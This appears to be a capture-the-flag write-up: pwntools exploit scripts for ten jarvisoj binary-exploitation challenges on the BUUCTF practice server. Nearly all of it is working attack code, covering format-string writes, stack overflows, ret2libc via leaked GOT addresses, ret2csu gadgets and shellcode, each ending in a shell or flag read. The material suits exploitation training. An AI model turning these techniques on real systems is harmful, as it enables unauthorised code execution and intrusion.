# buuctf wp part4

[bin file](https://github.com/song-10/notes/tree/master/writeups)

## jarvisoj_fm

```python
    from pwn import *
    context.arch='i386'

    # just a format exploit

    # p = process('./fm')
    p = remote('node3.buuoj.cn',27112)
    payload = fmtstr_payload(11,{0x0804A02C:4})
    p.send(payload)
    try:
        p.recvuntil("running sh...",timeout=1)
        sleep(1)
        p.interactive()
    except Exception as err:
        print err
```

## jarvisoj_level0

```python
from pwn import *
context.arch='amd64'

# p = process('./level0')
p = remote('node3.buuoj.cn',29411)

payload = 'A'*(0x80+8) + flat([ELF('./level0',checksec=False).sym['callsystem']])
p.send(payload)
sleep(1)
p.interactive()
```

## jarvisoj_level1

```python
    from pwn import *
    from LibcSearcher import *
    context.arch='i386'

    # there is not protect almostly, and the program leak the buf addr on stack
    # so, just write shellcode to get shell locally
    # but on server, the buf addr will leak after we input,
    # so, it's difficult to write shellcode on stack,
    # but we still could leak libc by stack overflow and get shell


    # p = process('./level1')
    p = remote('node3.buuoj.cn',26935)

    def locally():
        p.recvuntil("What's this:")
        buf_addr = int(p.recvuntil('?\n',drop=True),16)
        log.success('buf_addr = %#x',buf_addr)
        payload = asm(shellcraft.sh()).ljust(0x88+4,'\x00')
        payload += p32(buf_addr)
        p.send(payload)
        sleep(1)
        p.interactive()

    def servers():
        elf = ELF('./level1',checksec=False)
        payload = 'A'*(0x88+4)
        payload += flat([
            elf.plt['write'], elf.sym['main'], 1, elf.got['write'], 8
            ])
        p.send(payload)
        write_addr = u32(p.recv(4))
        log.success('write_addr = %#x',write_addr)

        libc = LibcSearcher('write',write_addr)
        libc_base = write_addr - libc.dump('write')
        system_addr = libc_base + libc.dump('system')
        binsh = libc_base + libc.dump('str_bin_sh')
        log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))

        payload = 'A'*(0x88+4)
        payload += flat([system_addr, elf.sym['main'], binsh])
        p.send(payload)
        sleep(1)
        p.interactive()

    servers()
```

## jarvisoj_level2

```python
from pwn import *
context.arch='i386'

# p = process('./level2')
p = remote('node3.buuoj.cn',29470)
elf = ELF('./level2')

payload = 'A'*(0x88+4)
payload += flat([elf.sym['read'], elf.sym['system'], 0, elf.bss(), 8, elf.bss()])
# make stack over flow,
# and call function read to get strings '/bin/sh\x00' for the function system,
# which function read retrun to
p.send(payload)
sleep(0.1)
p.send('/bin/sh\x00')
sleep(1)
p.interactive()
```

## jarvisoj_level2_x64

```python
from pwn import *
context.arch='amd64'

# there are function system and strings '/bin/sh' in program, just use it

# p = process('./level2_x64')
p = remote('node3.buuoj.cn',28826)
elf = ELF('./level2_x64',checksec=False)

binsh = elf.sym['hint']
system_addr = elf.sym['system']
main = elf.sym['main']

pop_rdi = 0x00000000004006b3 # pop rdi ; ret

payload = 'A'*(0x80+8)
payload += flat([pop_rdi, binsh, system_addr, main])
p.send(payload)
sleep(1)
p.interactive()
```

## jarvisoj_level3

```python
from pwn import *
from LibcSearcher import *
context.arch='i386'

# p = process('./level3')
p = remote('node3.buuoj.cn',26889)
elf = ELF('./level3',checksec=False)

read_got = elf.got['read']
write_plt = elf.plt['write']
main = elf.sym['main']

p.recvuntil('Input:')

payload = 'A'*(0x88+4)
payload += flat([write_plt, main, 1, read_got, 10])
p.send(payload)
p.recv()
# read the trash message

read_addr = u32(p.recv(4))
log.success('read_addr = %#x',read_addr)

libc = LibcSearcher('read',read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))

payload = 'A'*(0x88+4)
payload += flat([system_addr, main, binsh])
p.send(payload)
sleep(1)
p.interactive()
```

## jarvisoj_level3_x64

```python
from pwn import *
from LibcSearcher import *
context.arch='amd64'

# there isn't suitable gadget to leak address directly by call write
# but this program is 64bit, so we can use the universe gadgets to leak address

# p = process('./level3_x64')
p = remote('node3.buuoj.cn',28781)
elf = ELF('./level3_x64',checksec=False)
write_got = elf.got['write']
main = elf.sym['main']

gadget1 = 0x0000000000400690
# mov     rdx, r13
# mov     rsi, r14
# mov     edi, r15d
# call    qword ptr [r12+rbx*8]
# add     rbx, 1
# cmp     rbx, rbp
gadget2 = 0x00000000004006AA
# pop     rbx
# pop     rbp
# pop     r12
# pop     r13
# pop     r14
# pop     r15
ret_rdi = 0x00000000004006b3
# pop rdi ; ret

payload = 'A'*(0x80+8)
payload += flat([
    gadget2,
    0, 1, write_got,
    8, write_got, 1,
    gadget1])

# notice: make the register r12 point to write@got(or other function), not the write@plt
# because the write@got is the real address of write's body

payload += '\x00'*56    # addjust the stack, the universe gadgets will change the regin stack location
payload += p64(main)

p.recvuntil('Input:\n')
p.send(payload)
sleep(3)

write_addr = u64(p.recv(8))
log.success('write_addr = %#x',write_addr)

libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh = %#x'%(system_addr, binsh))

payload = 'A'*(0x80+8)
payload += flat([ret_rdi, binsh, system_addr ,main])
p.recvuntil('Input:')
p.send(payload)
sleep(1)
p.interactive()
```

## jarvisoj_level4

```python
from pwn import *
from LibcSearcher import *
context.arch='i386'

# p = process('./level4')
p = remote('node3.buuoj.cn',26779)
elf = ELF('./level4',checksec=False)

read_got = elf.got['read']
write_plt = elf.plt['write']
main = elf.sym['main']

payload = 'A'*(0x88+4)
payload += flat([write_plt, main, 1, read_got, 10])
p.send(payload)

read_addr = u32(p.recv(4))
log.success('read_addr = %#x',read_addr)

libc = LibcSearcher('read',read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))

payload = 'A'*(0x88+4)
payload += flat([system_addr, main, binsh])
p.send(payload)
sleep(1)
p.interactive()
# ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)
```

## jarvisoj_tell_me_something

```python
from pwn import *
context.arch='amd64'

# there is a function read the flag.txt in server, just call it

# p = process('./guestbook')
p = remote('node3.buuoj.cn',28480)
elf = ELF('./guestbook',checksec='False')

p.recvuntil("Input your message:\n")

payload = 'A'*0x88 + p64(elf.sym['good_game'])
p.send(payload)

p.recvuntil("I have received your message, Thank you!\n")
print p.recv()
```

## jarvisoj_test_your_memory

```python
from pwn import *
context.arch='i386'

# p = process('./memory')
p = remote('node3.buuoj.cn',27442)

# there are function which contains system and strings 'cat flag', overflow to call it and get flag

payload = 'A'*(0x13+4)
payload += flat([ELF('./memory',checksec=False).sym['win_func'], ELF('./memory',checksec=False).sym['main'], 0x080487E0])
p.sendline(payload)
p.interactive()
```
